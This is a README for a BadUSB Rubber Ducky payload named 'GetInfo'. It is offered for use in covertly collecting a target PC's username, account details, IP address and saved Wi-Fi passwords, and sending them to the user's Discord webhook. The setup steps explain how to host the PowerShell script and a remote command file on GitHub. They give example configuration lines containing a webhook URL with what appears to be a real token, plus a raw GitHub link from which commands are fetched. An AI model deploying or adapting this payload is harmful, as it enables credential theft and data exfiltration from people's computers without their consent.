# GetInfo - BadUSB Rubber Ducky Script

This BadUSB Rubber Ducky script is designed to swiftly collect information from a target's PC and transmit it to your personal Discord server. The script runs for approximately 3 seconds, gathering data such as username, computer name, disk location, account details, OS version, IP address, and previously signed-in Wi-Fi networks with passwords.

## How to Set Up


1. Duplicate this GitHub repository to host it online for accessibility.


2. Edit the code in the duplicated `getinfo.ps1` file to update the Discord webhook API credentials at line 7 and the URL to `command.txt` at line 9 with your specific information,
EXAMPLE:
$hookUrl = "https://discord.com/api/webhooks/1200265949126142156/HOwhnUPElKBeBX7_j7WMG8-jMlimPoAM3pTlc-uZMbCESmAPCdzF7YWq1DEYqxxuroKj"
$url = "https://github.com/6uard1an/Cool-FLipper-Zero-BadUSB-s/raw/main/command.txt"


4. On your BadUSB Rubber Ducky device, install the script from `RemoteHack.txt`.


5. Replace `'link-to/getinfo.ps1'` in the script with the custom hosted URL of your `.ps1` file within the duplicated GitHub repository.


5.The updated RemoteHack.txt is your new payload file.
By following these steps, you can deploy and customize the GetInfo script for your specific use case. Ensure that the Discord webhook and the URL to `command.txt` in your duplicated GitHub repository are correctly configured in the `.ps1` file for the script to function as intended, securely transmitting gathered information to your Discord server.
